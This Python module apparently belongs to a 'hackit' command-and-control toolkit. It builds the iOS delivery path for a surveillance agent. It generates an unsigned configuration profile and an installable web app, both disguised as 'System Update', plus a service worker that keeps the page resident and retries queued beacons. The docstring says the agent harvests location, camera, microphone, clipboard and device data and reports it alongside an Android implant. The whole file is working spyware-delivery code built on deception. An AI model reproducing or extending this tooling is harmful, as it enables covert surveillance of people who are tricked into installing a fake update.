"""iOS delivery: WebClip profile + installable PWA, no signing identity needed.

iOS will not side-load an APK, so the iOS path is a web agent: a Home Screen
WebClip that opens the C2's PWA. The PWA registers a service worker, keeps the
page resident and reports through the same store as the Android implant.

What a browser can actually reach is reported honestly by the agent: device and
build strings, screen, timezone, network, battery (Safari), geolocation, camera
and microphone via getUserMedia, clipboard on gesture. It cannot read SMS or the
filesystem — that is the platform line, not a bug.
"""
from __future__ import annotations

import base64
import os
import plistlib
import uuid

# 1x1-ish placeholder icon (PNG) used by the WebClip.
ICON = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAIAAAAlC+aJAAAAd0lEQVR42u3XsQ2AIBBAUTD0DGDLNMxEyUxM4zBOoC258K614UXuJ+R6txR5rhR8AAAAAAAAAABOBpT/z22N7Ud8+nSFAAA+J0d/UqqQHQBQIRVSIQAAFVIhOwCgQiqkQgAAKqRCdgBAhfwBAAAAAAAAAACAkwAvrCkUqLiOmdkAAAAASUVORK5CYII="
)


def profile(label: str, url: str, removable: bool = True) -> bytes:
    """A `.mobileconfig` carrying one WebClip, valid unsigned."""
    ident = "com.hackit.agent." + uuid.uuid4().hex[:12]
    clip = {
        "PayloadType": "com.apple.webClip.managed",
        "PayloadIdentifier": ident + ".clip",
        "PayloadUUID": str(uuid.uuid4()).upper(),
        "PayloadVersion": 1,
        "Label": label,
        "URL": url,
        "Icon": ICON,
        "IsRemovable": removable,
        "Precomposed": True,
    }
    return plistlib.dumps(
        {
            "PayloadContent": [clip],
            "PayloadDisplayName": label,
            "PayloadIdentifier": ident,
            "PayloadOrganization": "System Update",
            "PayloadType": "Configuration",
            "PayloadUUID": str(uuid.uuid4()).upper(),
            "PayloadVersion": 1,
            "PayloadRemovalDisallowed": False,
        },
        fmt=plistlib.FMT_XML,
    )


def write_profile(directory: str, label: str, url: str) -> str:
    os.makedirs(directory, exist_ok=True)
    path = os.path.join(directory, "hackit-webclip.mobileconfig")
    with open(path, "wb") as handle:
        handle.write(profile(label, url))
    return path


MANIFEST = {
    "name": "System Update",
    "short_name": "System Update",
    "start_url": "./",
    "scope": "./",
    "display": "standalone",
    "background_color": "#0b0f14",
    "theme_color": "#0b0f14",
    "icons": [],
}

SERVICE_WORKER = """/* resident PWA shell: cached page, queued beacon retries */
const CACHE = 'sys-update-v1';
const PAGE = new URL('./', self.location).pathname;
self.addEventListener('install', (e) => {
  e.waitUntil(caches.open(CACHE).then((c) => c.addAll(['./', './agent.js'])).then(() => self.skipWaiting()));
});
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', (e) => {
  if (e.request.method !== 'GET') return;
  e.respondWith(caches.match(e.request).then((hit) => hit || fetch(e.request)));
});
self.addEventListener('sync', (e) => {
  if (e.tag === 'hackit-sync') e.waitUntil(self.clients.matchAll().then((cs) => {
    cs.forEach((c) => c.postMessage({op: 'flush'}));
  }));
});
"""


def manifest(url: str) -> bytes:
    import json

    data = dict(MANIFEST)
    data["start_url"] = url
    data["scope"] = url
    data["icons"] = [
        {"src": "data:image/png;base64," + base64.b64encode(ICON).decode(), "sizes": "64x64", "type": "image/png"}
    ]
    return json.dumps(data, indent=2).encode()
